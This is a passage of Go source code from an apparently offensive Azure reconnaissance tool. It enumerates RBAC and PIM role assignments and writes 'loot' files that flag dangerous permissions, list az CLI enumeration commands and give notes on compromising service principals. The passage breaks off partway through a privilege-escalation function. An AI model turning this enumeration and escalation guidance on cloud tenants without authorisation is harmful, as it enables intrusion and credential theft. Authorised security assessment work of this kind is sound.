func (m *PermissionsModule) buildScopesForSubscription(ctx context.Context, subID string, authClient *armauthorization.RoleAssignmentsClient, cred *azinternal.StaticTokenCredential, logger internal.Logger) []string {
	var scopes []string

	// 1. Tenant root (if tenant level is enabled)
	if m.TenantLevel {
		scopes = append(scopes, "/")
	}

	// 2. Management group hierarchy
	mgHierarchy := azinternal.GetManagementGroupHierarchy(ctx, m.Session, subID)
	for _, mgID := range mgHierarchy {
		scopes = append(scopes, fmt.Sprintf("/providers/Microsoft.Management/managementGroups/%s", mgID))
	}

	// 3. Subscription level
	if m.SubLevel {
		scopes = append(scopes, fmt.Sprintf("/subscriptions/%s", subID))
	}

	// 4. Resource group level (if enabled)
	if m.RGLevel {
		rgClient, err := armresources.NewResourceGroupsClient(subID, cred, nil)
		if err == nil {
			pager := rgClient.NewListPager(nil)
			for pager.More() {
				page, err := pager.NextPage(ctx)
				if err != nil {
					break
				}
				for _, rg := range page.Value {
					if rg.ID != nil {
						scopes = append(scopes, *rg.ID)
					}
				}
			}
		}
	}

	return scopes
}

// ======================
// checkPrincipalAtScopes - Check a principal's role assignments at all scopes
// ======================
func (m *PermissionsModule) checkPrincipalAtScopes(ctx context.Context, principal azinternal.PrincipalInfo, groupMemberships map[string]string, scopes []string, subID, subName string, authClient *armauthorization.RoleAssignmentsClient, logger internal.Logger) {
	// Build list of principal IDs to check (user + their groups)
	principalIDs := []string{principal.ObjectID}
	for groupID := range groupMemberships {
		principalIDs = append(principalIDs, groupID)
	}

	// For each scope, check role assignments for this principal (and their groups)
	for _, scope := range scopes {
		for _, principalID := range principalIDs {
			// Check if this is the direct principal or a group
			isDirect := principalID == principal.ObjectID
			groupName := ""
			if !isDirect {
				groupName = groupMemberships[principalID]
			}

			// Query role assignments with principal filter
			filter := fmt.Sprintf("principalId eq '%s'", principalID)
			pager := authClient.NewListForScopePager(scope, &armauthorization.RoleAssignmentsClientListForScopeOptions{
				Filter: &filter,
			})

			for pager.More() {
				page, err := pager.NextPage(ctx)
				if err != nil {
					if m.Verbosity >= globals.AZ_VERBOSE_ERRORS {
						logger.ErrorM(fmt.Sprintf("Failed to list role assignments for principal %s at scope %s: %v", principalID, scope, err), globals.AZ_PERMISSIONS_MODULE_NAME)
					}
					break
				}

				for _, ra := range page.Value {
					// Determine attribution
					assignedVia := "Direct"
					if !isDirect {
						if groupName != "" {
							assignedVia = fmt.Sprintf("Group: %s", groupName)
						} else {
							assignedVia = "Group"
						}
					}

					// Expand this role assignment with the ORIGINAL principal's info
					m.expandRoleAssignmentForPrincipal(ctx, ra, principal, subID, subName, assignedVia, logger)
				}
			}
		}
	}
}

// ======================
// checkPrincipalPIM - Check PIM assignments for a principal
// ======================
func (m *PermissionsModule) checkPrincipalPIM(ctx context.Context, principal azinternal.PrincipalInfo, groupMemberships map[string]string, subID, subName, token string, logger internal.Logger) {
	// Build list of principal IDs (user + their groups)
	principalIDs := map[string]string{principal.ObjectID: ""}
	for groupID, groupName := range groupMemberships {
		principalIDs[groupID] = groupName
	}

	// Check PIM Eligible
	pimEligibilityURL := fmt.Sprintf("https://management.azure.com/subscriptions/%s/providers/Microsoft.Authorization/roleEligibilityScheduleInstances?api-version=2020-10-01&$filter=asTarget()", subID)
	pimBody, err := azinternal.HTTPRequestWithRetry(ctx, "GET", pimEligibilityURL, token, nil, azinternal.DefaultRateLimitConfig())
	if err == nil {
		var pimData struct {
			Value []struct {
				Properties struct {
					PrincipalID        string `json:"principalId"`
					RoleDefinitionID   string `json:"roleDefinitionId"`
					Scope              string `json:"scope"`
					ExpandedProperties struct {
						Principal struct {
							DisplayName string `json:"displayName"`
							Type        string `json:"type"`
						} `json:"principal"`
						RoleDefinition struct {
							DisplayName string `json:"displayName"`
						} `json:"roleDefinition"`
					} `json:"expandedProperties"`
				} `json:"properties"`
			} `json:"value"`
		}

		if json.Unmarshal(pimBody, &pimData) == nil {
			for _, pimAssignment := range pimData.Value {
				// Check if this PIM assignment is for the principal or their groups
				if groupName, exists := principalIDs[pimAssignment.Properties.PrincipalID]; exists {
					isDirect := pimAssignment.Properties.PrincipalID == principal.ObjectID
					assignedVia := "Direct (PIM Eligible)"
					if !isDirect {
						if groupName != "" {
							assignedVia = fmt.Sprintf("Group: %s (PIM Eligible)", groupName)
						} else {
							assignedVia = "Group (PIM Eligible)"
						}
					}

					m.expandPIMRoleForPrincipal(ctx, principal, pimAssignment.Properties.RoleDefinitionID,
						pimAssignment.Properties.ExpandedProperties.RoleDefinition.DisplayName,
						pimAssignment.Properties.Scope, subID, subName, assignedVia, logger)
				}
			}
		}
	}

	// Check PIM Active
	pimActiveURL := fmt.Sprintf("https://management.azure.com/subscriptions/%s/providers/Microsoft.Authorization/roleAssignmentScheduleInstances?api-version=2020-10-01&$filter=asTarget()", subID)
	pimBody, err = azinternal.HTTPRequestWithRetry(ctx, "GET", pimActiveURL, token, nil, azinternal.DefaultRateLimitConfig())
	if err == nil {
		var pimData struct {
			Value []struct {
				Properties struct {
					PrincipalID        string `json:"principalId"`
					RoleDefinitionID   string `json:"roleDefinitionId"`
					Scope              string `json:"scope"`
					ExpandedProperties struct {
						Principal struct {
							DisplayName string `json:"displayName"`
							Type        string `json:"type"`
						} `json:"principal"`
						RoleDefinition struct {
							DisplayName string `json:"displayName"`
						} `json:"roleDefinition"`
					} `json:"expandedProperties"`
				} `json:"properties"`
			} `json:"value"`
		}

		if json.Unmarshal(pimBody, &pimData) == nil {
			for _, pimAssignment := range pimData.Value {
				// Check if this PIM assignment is for the principal or their groups
				if groupName, exists := principalIDs[pimAssignment.Properties.PrincipalID]; exists {
					isDirect := pimAssignment.Properties.PrincipalID == principal.ObjectID
					assignedVia := "Direct (PIM Active)"
					if !isDirect {
						if groupName != "" {
							assignedVia = fmt.Sprintf("Group: %s (PIM Active)", groupName)
						} else {
							assignedVia = "Group (PIM Active)"
						}
					}

					m.expandPIMRoleForPrincipal(ctx, principal, pimAssignment.Properties.RoleDefinitionID,
						pimAssignment.Properties.ExpandedProperties.RoleDefinition.DisplayName,
						pimAssignment.Properties.Scope, subID, subName, assignedVia, logger)
				}
			}
		}
	}
}

// ======================
// expandRoleAssignmentForPrincipal - Expand role assignment for a specific principal
// ======================
func (m *PermissionsModule) expandRoleAssignmentForPrincipal(ctx context.Context, ra *armauthorization.RoleAssignment, principal azinternal.PrincipalInfo, subID, subName, assignedVia string, logger internal.Logger) {
	if ra == nil || ra.Properties == nil {
		return
	}

	roleDefID := ""
	scope := ""
	condition := ""

	if ra.Properties.RoleDefinitionID != nil {
		roleDefID = *ra.Properties.RoleDefinitionID
	}
	if ra.Properties.Scope != nil {
		scope = *ra.Properties.Scope
	}
	if ra.Properties.Condition != nil {
		condition = *ra.Properties.Condition
	}

	// Create principal info
	principalInfo := &PrincipalInfo{
		Name: principal.DisplayName,
		UPN:  principal.UserPrincipalName,
		Type: principal.UserType,
	}

	// Get role definition
	m.mu.Lock()
	roleDef, exists := m.RoleDefinitions[roleDefID]
	if !exists {
		parts := strings.Split(roleDefID, "/")
		if len(parts) > 0 {
			roleGUID := parts[len(parts)-1]
			roleDef, exists = m.RoleDefinitions[roleGUID]
		}
	}
	m.mu.Unlock()

	if !exists || roleDef == nil {
		m.addPermissionRow(principalInfo, principal.ObjectID, principal.UserType, "Unknown Role",
			"Unknown", roleDefID, scope, subName, assignedVia, condition)
		return
	}

	roleName := "Unknown"
	if roleDef.Properties != nil && roleDef.Properties.RoleName != nil {
		roleName = *roleDef.Properties.RoleName
	}

	// Expand permissions
	if roleDef.Properties != nil && roleDef.Properties.Permissions != nil {
		for _, perm := range roleDef.Properties.Permissions {
			if perm.Actions != nil {
				for _, action := range perm.Actions {
					if action != nil {
						m.addPermissionRow(principalInfo, principal.ObjectID, principal.UserType, roleName,
							"Action", *action, scope, subName, assignedVia, condition)
					}
				}
			}
			if perm.NotActions != nil {
				for _, notAction := range perm.NotActions {
					if notAction != nil {
						m.addPermissionRow(principalInfo, principal.ObjectID, principal.UserType, roleName,
							"NotAction", *notAction, scope, subName, assignedVia, condition)
					}
				}
			}
			if perm.DataActions != nil {
				for _, dataAction := range perm.DataActions {
					if dataAction != nil {
						m.addPermissionRow(principalInfo, principal.ObjectID, principal.UserType, roleName,
							"DataAction", *dataAction, scope, subName, assignedVia, condition)
					}
				}
			}
			if perm.NotDataActions != nil {
				for _, notDataAction := range perm.NotDataActions {
					if notDataAction != nil {
						m.addPermissionRow(principalInfo, principal.ObjectID, principal.UserType, roleName,
							"NotDataAction", *notDataAction, scope, subName, assignedVia, condition)
					}
				}
			}
		}
	}
}

// ======================
// expandPIMRoleForPrincipal - Expand PIM role for a specific principal
// ======================
func (m *PermissionsModule) expandPIMRoleForPrincipal(ctx context.Context, principal azinternal.PrincipalInfo, roleDefID, roleName, scope, subID, subName, assignedVia string, logger internal.Logger) {
	// Create principal info
	principalInfo := &PrincipalInfo{
		Name: principal.DisplayName,
		UPN:  principal.UserPrincipalName,
		Type: principal.UserType,
	}

	// Get role definition
	m.mu.Lock()
	roleDef, exists := m.RoleDefinitions[roleDefID]
	if !exists {
		parts := strings.Split(roleDefID, "/")
		if len(parts) > 0 {
			roleGUID := parts[len(parts)-1]
			roleDef, exists = m.RoleDefinitions[roleGUID]
		}
	}
	m.mu.Unlock()

	if !exists || roleDef == nil {
		m.addPermissionRow(principalInfo, principal.ObjectID, principal.UserType, roleName,
			"Unknown", roleDefID, scope, subName, assignedVia, "")
		return
	}

	// Expand permissions
	if roleDef.Properties != nil && roleDef.Properties.Permissions != nil {
		for _, perm := range roleDef.Properties.Permissions {
			if perm.Actions != nil {
				for _, action := range perm.Actions {
					if action != nil {
						m.addPermissionRow(principalInfo, principal.ObjectID, principal.UserType, roleName,
							"Action", *action, scope, subName, assignedVia, "")
					}
				}
			}
			if perm.NotActions != nil {
				for _, notAction := range perm.NotActions {
					if notAction != nil {
						m.addPermissionRow(principalInfo, principal.ObjectID, principal.UserType, roleName,
							"NotAction", *notAction, scope, subName, assignedVia, "")
					}
				}
			}
			if perm.DataActions != nil {
				for _, dataAction := range perm.DataActions {
					if dataAction != nil {
						m.addPermissionRow(principalInfo, principal.ObjectID, principal.UserType, roleName,
							"DataAction", *dataAction, scope, subName, assignedVia, "")
					}
				}
			}
			if perm.NotDataActions != nil {
				for _, notDataAction := range perm.NotDataActions {
					if notDataAction != nil {
						m.addPermissionRow(principalInfo, principal.ObjectID, principal.UserType, roleName,
							"NotDataAction", *notDataAction, scope, subName, assignedVia, "")
					}
				}
			}
		}
	}
}

// ======================
// getGroupInfo - Get group information (with caching)
// ======================
func (m *PermissionsModule) getGroupInfo(ctx context.Context, groupID string, logger internal.Logger) *PrincipalInfo {
	m.mu.Lock()
	if info, exists := m.GroupCache[groupID]; exists {
		m.mu.Unlock()
		return info
	}
	m.mu.Unlock()

	// Fetch group info from Graph API
	info := &PrincipalInfo{
		Name: "Unknown Group",
		UPN:  "N/A",
		Type: "Group",
	}

	token, err := m.Session.GetTokenForResource(globals.CommonScopes[1]) // Microsoft Graph
	if err != nil {
		return info
	}

	url := fmt.Sprintf("https://graph.microsoft.com/v1.0/groups/%s?$select=displayName", groupID)
	body, err := azinternal.GraphAPIRequestWithRetry(ctx, "GET", url, token)
	if err == nil {
		var groupData struct {
			DisplayName string `json:"displayName"`
		}
		if json.Unmarshal(body, &groupData) == nil && groupData.DisplayName != "" {
			info.Name = groupData.DisplayName
		}
	}

	// Cache the result
	m.mu.Lock()
	m.GroupCache[groupID] = info
	m.mu.Unlock()

	return info
}

// addPermissionRow adds a permission row to the output
func (m *PermissionsModule) addPermissionRow(principalInfo *PrincipalInfo, principalID, principalType,
	roleName, permType, permission, scope, subName, assignedVia, condition string) {

	// Parse scope
	scopeType, scopeName := m.parseScope(scope, subName)

	row := []string{
		principalID,        // Principal GUID
		principalInfo.Name, // Principal Name
		principalInfo.UPN,  // Principal UPN/AppID
		principalType,      // Principal Type
		roleName,           // Role Name
		permType,           // Permission Type (Action/NotAction/DataAction/NotDataAction)
		permission,         // Permission (e.g., Microsoft.Compute/virtualMachines/write)
		m.TenantName,       // Tenant Name (always populated for multi-tenant support)
		m.TenantID,         // Tenant ID (always populated for multi-tenant support)
		scopeType,          // Scope Type
		scopeName,          // Scope Name
		scope,              // Full Scope Path
		assignedVia,        // Assigned Via
		condition,          // Condition
	}

	m.mu.Lock()
	m.PermissionRows = append(m.PermissionRows, row)
	m.mu.Unlock()
}

// parseScope parses a scope string into type and name
func (m *PermissionsModule) parseScope(scope, subName string) (scopeType, scopeName string) {
	if scope == "/" {
		return "Tenant", m.TenantName
	}

	if strings.Contains(scope, "/managementGroups/") {
		parts := strings.Split(scope, "/")
		for i, part := range parts {
			if part == "managementGroups" && i+1 < len(parts) {
				return "ManagementGroup", parts[i+1]
			}
		}
		return "ManagementGroup", "Unknown"
	}

	if strings.HasPrefix(scope, "/subscriptions/") {
		parts := strings.Split(scope, "/")

		// Check for resource group
		for i, part := range parts {
			if part == "resourceGroups" && i+1 < len(parts) {
				return "ResourceGroup", parts[i+1]
			}
		}

		// Check for specific resource
		if strings.Contains(scope, "/providers/") {
			return "Resource", permissionsExtractResourceName(scope)
		}

		// Subscription level
		return "Subscription", subName
	}

	return "Unknown", "Unknown"
}

// extractResourceName extracts resource name from resource ID

// ======================
// writeOutput - Write all collected permissions
// ======================
func (m *PermissionsModule) writeOutput(ctx context.Context, logger internal.Logger) {
	if len(m.PermissionRows) == 0 {
		logger.InfoM("No permissions found", globals.AZ_PERMISSIONS_MODULE_NAME)
		return
	}

	logger.InfoM(fmt.Sprintf("Dataset size: %d permission rows", len(m.PermissionRows)), globals.AZ_PERMISSIONS_MODULE_NAME)

	// Sort by tenant, then principal ID, then role, then permission
	sort.Slice(m.PermissionRows, func(i, j int) bool {
		// Column 7: Tenant Name
		if m.PermissionRows[i][7] != m.PermissionRows[j][7] {
			return m.PermissionRows[i][7] < m.PermissionRows[j][7]
		}
		// Column 0: Principal GUID
		if m.PermissionRows[i][0] != m.PermissionRows[j][0] {
			return m.PermissionRows[i][0] < m.PermissionRows[j][0]
		}
		// Column 4: Role Name
		if m.PermissionRows[i][4] != m.PermissionRows[j][4] {
			return m.PermissionRows[i][4] < m.PermissionRows[j][4]
		}
		// Column 6: Permission
		return m.PermissionRows[i][6] < m.PermissionRows[j][6]
	})

	// Check if we should split output by tenant (multi-tenant mode)
	if azinternal.ShouldSplitByTenant(m.IsMultiTenant, m.Tenants) {
		// Split into separate tenant directories
		if err := m.FilterAndWritePerTenantAuto(
			ctx,
			logger,
			m.Tenants,
			m.PermissionRows,
			PermissionsHeader,
			"permissions",
			globals.AZ_PERMISSIONS_MODULE_NAME,
		); err != nil {
			return
		}
		return
	}

	// Check if we should split output by subscription (multiple subs WITHOUT --tenant flag, single tenant)
	if azinternal.ShouldSplitBySubscription(m.Subscriptions, m.TenantFlagPresent) {
		// Split by subscription (column 10 = Scope Name, updated from 8 due to new tenant columns)
		if err := m.FilterAndWritePerSubscriptionAuto(
			ctx, logger, m.Subscriptions, m.PermissionRows, PermissionsHeader,
			"permissions", globals.AZ_PERMISSIONS_MODULE_NAME,
		); err != nil {
			return
		}
		return
	}

	// Otherwise: consolidated output
	scopeType, scopeIDs, scopeNames := azinternal.DetermineScopeForOutput(
		m.Subscriptions, m.TenantID, m.TenantName, m.TenantFlagPresent)
	scopeNames = azinternal.GetSubscriptionNamesForOutput(ctx, m.Session, scopeType, scopeIDs)

	// Generate loot files
	lootFiles := m.generatePermissionsLootFiles()

	// Prepare output
	output := PermissionsOutput{
		Table: []internal.TableFile{
			{
				Name:   "permissions",
				Header: PermissionsHeader,
				Body:   m.PermissionRows,
			},
		},
		Loot: lootFiles,
	}

	// Write output using HandleOutputSmart (auto-streaming for large datasets)
	if err := internal.HandleOutputSmart(
		"Azure",
		m.Format,
		m.OutputDirectory,
		m.Verbosity,
		m.WrapTable,
		scopeType,
		scopeIDs,
		scopeNames,
		m.UserUPN,
		output,
	); err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), globals.AZ_PERMISSIONS_MODULE_NAME)
		m.CommandCounter.Error++
		return
	}

	logger.SuccessM(fmt.Sprintf("Found %d permission entries across %d principals",
		len(m.PermissionRows), len(m.PrincipalCache)), globals.AZ_PERMISSIONS_MODULE_NAME)
}

// ======================
// Loot File Generation
// ======================

// generatePermissionsLootFiles creates actionable loot files from permissions data
func (m *PermissionsModule) generatePermissionsLootFiles() []internal.LootFile {
	var lootFiles []internal.LootFile

	// 1. Dangerous permissions (write/delete/wildcard permissions)
	if dangerousLoot := m.generateDangerousPermissionsLoot(); dangerousLoot != "" {
		lootFiles = append(lootFiles, internal.LootFile{
			Name:     "permissions-dangerous",
			Contents: dangerousLoot,
		})
	}

	// 2. Service principals with dangerous permissions
	if spLoot := m.generateServicePrincipalPermissionsLoot(); spLoot != "" {
		lootFiles = append(lootFiles, internal.LootFile{
			Name:     "permissions-service-principals",
			Contents: spLoot,
		})
	}

	// 3. Permission enumeration commands
	if enumLoot := m.generatePermissionEnumerationCommandsLoot(); enumLoot != "" {
		lootFiles = append(lootFiles, internal.LootFile{
			Name:     "permissions-enumeration-commands",
			Contents: enumLoot,
		})
	}

	// 4. Privilege escalation paths based on dangerous permissions
	if escLoot := m.generatePrivilegeEscalationPathsLoot(); escLoot != "" {
		lootFiles = append(lootFiles, internal.LootFile{
			Name:     "permissions-privilege-escalation",
			Contents: escLoot,
		})
	}

	return lootFiles
}

// generateDangerousPermissionsLoot identifies highly privileged/dangerous permissions
func (m *PermissionsModule) generateDangerousPermissionsLoot() string {
	// Define dangerous permission patterns
	dangerousPatterns := map[string]string{
		"Microsoft.Authorization/roleAssignments/write": "Can assign Azure RBAC roles - CRITICAL for privilege escalation",
		"Microsoft.Authorization/*/write":               "Can modify authorization settings",
		"Microsoft.Compute/virtualMachines/runCommand":  "Can execute commands on VMs - remote code execution",
		"Microsoft.KeyVault/vaults/secrets/read":        "Can read Key Vault secrets - credential access",
		"Microsoft.Storage/storageAccounts/listKeys":    "Can list storage account keys - full storage access",
		"Microsoft.Sql/servers/databases/*":             "Full database access",
		"Microsoft.Web/sites/config/*":                  "Can access app service configurations and connection strings",
		"Microsoft.ContainerService/managedClusters/*":  "Full AKS cluster access - potential container escape",
		"Microsoft.Automation/automationAccounts/*":     "Can create/modify automation runbooks - code execution",
		"Microsoft.Compute/virtualMachines/write":       "Can create/modify VMs",
		"Microsoft.Network/networkSecurityGroups/write": "Can modify network security rules",
		"*":                     "Wildcard permission - effectively full control",
		"Microsoft.*/*":         "Wildcard over Microsoft resources",
		"Microsoft.*/*/write":   "Wildcard write permission",
		"Microsoft.*/*/delete":  "Wildcard delete permission",
		"Microsoft.Graph/*":     "Microsoft Graph API access",
		"Directory.ReadWrite.*": "Can modify Entra ID directory",
	}

	type DangerousPermission struct {
		PrincipalGUID string
		PrincipalName string
		PrincipalUPN  string
		PrincipalType string
		RoleName      string
		Permission    string
		PermType      string
		Scope         string
		AssignedVia   string
		Description   string
	}

	var dangerousPerms []DangerousPermission
	seenCombinations := make(map[string]bool)

	// Scan all permission rows
	for _, row := range m.PermissionRows {
		if len(row) < 14 {
			continue
		}

		principalGUID := row[0]
		principalName := row[1]
		principalUPN := row[2]
		principalType := row[3]
		roleName := row[4]
		permType := row[5]
		permission := row[6]
		scope := row[11]
		assignedVia := row[12]

		// Check if this permission matches any dangerous pattern
		for pattern, description := range dangerousPatterns {
			if matchesPermissionPattern(permission, pattern) {
				// Deduplicate by principal+permission+scope
				key := fmt.Sprintf("%s|%s|%s", principalGUID, permission, scope)
				if !seenCombinations[key] {
					seenCombinations[key] = true
					dangerousPerms = append(dangerousPerms, DangerousPermission{
						PrincipalGUID: principalGUID,
						PrincipalName: principalName,
						PrincipalUPN:  principalUPN,
						PrincipalType: principalType,
						RoleName:      roleName,
						Permission:    permission,
						PermType:      permType,
						Scope:         scope,
						AssignedVia:   assignedVia,
						Description:   description,
					})
				}
				break
			}
		}
	}

	if len(dangerousPerms) == 0 {
		return ""
	}

	var loot strings.Builder
	loot.WriteString("# Dangerous Permissions Found\n\n")
	loot.WriteString(fmt.Sprintf("Found %d dangerous permission assignments that could be used for privilege escalation or data access.\n\n", len(dangerousPerms)))

	// Group by principal
	principalGroups := make(map[string][]DangerousPermission)
	for _, perm := range dangerousPerms {
		principalGroups[perm.PrincipalGUID] = append(principalGroups[perm.PrincipalGUID], perm)
	}

	loot.WriteString("## Principals with Dangerous Permissions\n\n")
	for principalGUID, perms := range principalGroups {
		firstPerm := perms[0]
		loot.WriteString(fmt.Sprintf("### %s (%s)\n", firstPerm.PrincipalName, firstPerm.PrincipalType))
		loot.WriteString(fmt.Sprintf("- **Principal GUID**: %s\n", principalGUID))
		loot.WriteString(fmt.Sprintf("- **UPN/AppID**: %s\n\n", firstPerm.PrincipalUPN))

		loot.WriteString("**Dangerous Permissions**:\n")
		for _, perm := range perms {
			loot.WriteString(fmt.Sprintf("- `%s` (%s) via role **%s**\n", perm.Permission, perm.PermType, perm.RoleName))
			loot.WriteString(fmt.Sprintf("  - Scope: `%s`\n", perm.Scope))
			loot.WriteString(fmt.Sprintf("  - Assigned via: %s\n", perm.AssignedVia))
			loot.WriteString(fmt.Sprintf("  - Risk: %s\n", perm.Description))
		}

		loot.WriteString("\n**Investigation Commands**:\n")
		loot.WriteString(fmt.Sprintf("```bash\n# Get full details about this principal\naz ad sp show --id %s\naz ad user show --id %s\n\n", principalGUID, principalGUID))
		loot.WriteString(fmt.Sprintf("# Get all role assignments for this principal\naz role assignment list --assignee %s --all --output table\n\n", principalGUID))
		loot.WriteString("# Check for PIM eligibility\naz rest --method GET --url \"https://management.azure.com/providers/Microsoft.Authorization/roleEligibilityScheduleInstances?api-version=2020-10-01&$filter=asTarget()\"\n```\n\n")
	}

	return loot.String()
}

// generateServicePrincipalPermissionsLoot identifies service principals with dangerous permissions
func (m *PermissionsModule) generateServicePrincipalPermissionsLoot() string {
	type SPWithPerms struct {
		GUID        string
		Name        string
		AppID       string
		Permissions []string
		Roles       []string
		Scopes      []string
	}

	spMap := make(map[string]*SPWithPerms)

	// Find all service principals with write/wildcard permissions
	for _, row := range m.PermissionRows {
		if len(row) < 14 {
			continue
		}

		principalType := row[3]
		if !strings.Contains(strings.ToLower(principalType), "serviceprincipal") &&
			!strings.Contains(strings.ToLower(principalType), "managedidentity") {
			continue
		}

		permission := row[6]
		// Look for write, delete, or wildcard permissions
		if !strings.Contains(strings.ToLower(permission), "write") &&
			!strings.Contains(strings.ToLower(permission), "delete") &&
			!strings.Contains(permission, "*") &&
			!strings.Contains(permission, "listKeys") &&
			!strings.Contains(permission, "runCommand") {
			continue
		}

		principalGUID := row[0]
		if _, exists := spMap[principalGUID]; !exists {
			spMap[principalGUID] = &SPWithPerms{
				GUID:        principalGUID,
				Name:        row[1],
				AppID:       row[2],
				Permissions: []string{},
				Roles:       []string{},
				Scopes:      []string{},
			}
		}

		// Add unique permissions, roles, and scopes
		sp := spMap[principalGUID]
		if !permissionsContains(sp.Permissions, permission) {
			sp.Permissions = append(sp.Permissions, permission)
		}
		roleName := row[4]
		if !permissionsContains(sp.Roles, roleName) {
			sp.Roles = append(sp.Roles, roleName)
		}
		scope := row[11]
		if !permissionsContains(sp.Scopes, scope) {
			sp.Scopes = append(sp.Scopes, scope)
		}
	}

	if len(spMap) == 0 {
		return ""
	}

	var loot strings.Builder
	loot.WriteString("# Service Principals with Dangerous Permissions\n\n")
	loot.WriteString(fmt.Sprintf("Found %d service principals/managed identities with write, delete, or wildcard permissions.\n", len(spMap)))
	loot.WriteString("These are high-value targets for exploitation as they often have over-privileged access.\n\n")

	for _, sp := range spMap {
		loot.WriteString(fmt.Sprintf("## %s\n", sp.Name))
		loot.WriteString(fmt.Sprintf("- **Object ID**: %s\n", sp.GUID))
		loot.WriteString(fmt.Sprintf("- **App/Client ID**: %s\n", sp.AppID))
		loot.WriteString(fmt.Sprintf("- **Roles**: %s\n", strings.Join(sp.Roles, ", ")))
		loot.WriteString(fmt.Sprintf("- **Permissions**: %d dangerous permissions\n", len(sp.Permissions)))
		loot.WriteString(fmt.Sprintf("- **Scopes**: %d\n\n", len(sp.Scopes)))

		loot.WriteString("**Dangerous Permissions**:\n")
		for _, perm := range sp.Permissions {
			loot.WriteString(fmt.Sprintf("- `%s`\n", perm))
		}

		loot.WriteString("\n**Investigation Commands**:\n")
		loot.WriteString("```bash\n# Get service principal details\n")
		loot.WriteString(fmt.Sprintf("az ad sp show --id %s --output json\n\n", sp.GUID))
		loot.WriteString("# Check for credentials/certificates\n")
		loot.WriteString(fmt.Sprintf("az ad sp credential list --id %s\n\n", sp.GUID))
		loot.WriteString("# Check for federated credentials (workload identity)\n")
		loot.WriteString(fmt.Sprintf("az ad app federated-credential list --id %s\n\n", sp.AppID))
		loot.WriteString("# Get full role assignments\n")
		loot.WriteString(fmt.Sprintf("az role assignment list --assignee %s --all --output table\n", sp.GUID))
		loot.WriteString("```\n\n")
	}

	loot.WriteString("\n## Exploitation Notes\n\n")
	loot.WriteString("Service principals can be compromised through:\n")
	loot.WriteString("1. **Client Secret/Certificate Theft**: Check automation code, CI/CD pipelines, config files\n")
	loot.WriteString("2. **Federated Credentials**: Exploit OIDC token exchange if federated identity is misconfigured\n")
	loot.WriteString("3. **Managed Identity IMDS**: Access Azure Instance Metadata Service from compromised VMs/containers\n")
	loot.WriteString("4. **Key Vault References**: Service principals often store credentials in Key Vault\n\n")

	return loot.String()
}

// generatePermissionEnumerationCommandsLoot creates commands for further enumeration
func (m *PermissionsModule) generatePermissionEnumerationCommandsLoot() string {
	var loot strings.Builder
	loot.WriteString("# Permission Enumeration Commands\n\n")
	loot.WriteString("Use these commands to further investigate permissions and identify privilege escalation opportunities.\n\n")

	// Get unique tenant IDs and subscription IDs
	tenants := make(map[string]string)   // tenantID -> tenantName
	subscriptions := make(map[string]bool)

	for _, row := range m.PermissionRows {
		if len(row) >= 14 {
			tenantName := row[7]
			tenantID := row[8]
			if tenantName != "" && tenantID != "" {
				tenants[tenantID] = tenantName
			}

			scope := row[11]
			if strings.HasPrefix(scope, "/subscriptions/") {
				parts := strings.Split(scope, "/")
				if len(parts) >= 3 {
					subscriptions[parts[2]] = true
				}
			}
		}
	}

	loot.WriteString("## Tenant-Level Enumeration\n\n")
	for tenantID, tenantName := range tenants {
		loot.WriteString(fmt.Sprintf("### %s (%s)\n\n", tenantName, tenantID))
		loot.WriteString("```bash\n")
		loot.WriteString(fmt.Sprintf("# Set tenant context\naz account set --tenant %s\n\n", tenantID))
		loot.WriteString("# List all custom roles (custom roles often have dangerous permissions)\n")
		loot.WriteString("az role definition list --custom-role-only true --output table\n\n")
		loot.WriteString("# List all Entra ID directory roles\n")
		loot.WriteString("az rest --method GET --url \"https://graph.microsoft.com/v1.0/directoryRoles\"\n\n")
		loot.WriteString("# List all Entra ID directory role assignments\n")
		loot.WriteString("az rest --method GET --url \"https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?$expand=principal\"\n\n")
		loot.WriteString("# Check for PIM eligibility\n")
		loot.WriteString("az rest --method GET --url \"https://management.azure.com/providers/Microsoft.Authorization/roleEligibilityScheduleInstances?api-version=2020-10-01&$filter=asTarget()\"\n")
		loot.WriteString("```\n\n")
	}

	if len(subscriptions) > 0 {
		loot.WriteString("## Subscription-Level Enumeration\n\n")
		loot.WriteString("```bash\n")
		for subID := range subscriptions {
			loot.WriteString(fmt.Sprintf("# Subscription: %s\n", subID))
			loot.WriteString(fmt.Sprintf("az role assignment list --all --subscription %s --output table\n\n", subID))
		}
		loot.WriteString("```\n\n")
	}

	loot.WriteString("## Specific Permission Checks\n\n")
	loot.WriteString("```bash\n")
	loot.WriteString("# Find principals with roleAssignments/write (can assign roles)\n")
	loot.WriteString("grep -i \"roleAssignments/write\" cloudfox-output/azure/permissions.csv\n\n")
	loot.WriteString("# Find principals with Key Vault access\n")
	loot.WriteString("grep -i \"Microsoft.KeyVault\" cloudfox-output/azure/permissions.csv\n\n")
	loot.WriteString("# Find principals with VM command execution\n")
	loot.WriteString("grep -i \"runCommand\" cloudfox-output/azure/permissions.csv\n\n")
	loot.WriteString("# Find wildcard permissions\n")
	loot.WriteString("grep \"\\*\" cloudfox-output/azure/permissions.csv\n\n")
	loot.WriteString("# Find storage account key access\n")
	loot.WriteString("grep -i \"listKeys\" cloudfox-output/azure/permissions.csv\n")
	loot.WriteString("```\n\n")

	return loot.String()
}

// generatePrivilegeEscalationPathsLoot provides privilege escalation techniques based on found permissions
func (m *PermissionsModule) generatePrivilegeEscalationPathsLoot() string {
	// Track which escalation paths are relevant based on permissions found
	escalationPaths := make(map[string]bool)

	for _, row := range m.PermissionRows {
		if len(row) < 14 {
			continue
		}

		permission := row[6]

		// Identify relevant escalation paths
		if strings.Contains(permission, "Microsoft.Authorization/roleAssignments/write") ||
			strings.Contains(permission, "Microsoft.Authorization/*/write") {
			escalationPaths["role_assignment"] = true
		}
		if strings.Contains(permission, "Microsoft.Compute/virtualMachines/runCommand") {
			escalationPaths["vm_command_execution"] = true
		}
		if strings.Contains(permission, "Microsoft.KeyVault/vaults/secrets") {
			escalationPaths["keyvault_secrets"] = true
		}
		if strings.Contains(permission, "Microsoft.Storage/storageAccounts/listKeys") {
			escalationPaths["storage_keys"] = true
		}
		if strings.Contains(permission, "Microsoft.Automation/automationAccounts") {
			escalationPaths["automation_runbooks"] = true
		}
		if strings.Contains(permission, "Microsoft.Compute/virtualMachines/write") {
			escalationPaths["vm_creation"] = true
		}
		if strings.Contains(permission, "Microsoft.Web/sites/config") {
			escalationPaths["app_service_config"] = true
		}
		if strings.Contains(permission, "Microsoft.ContainerService/managedClusters") {
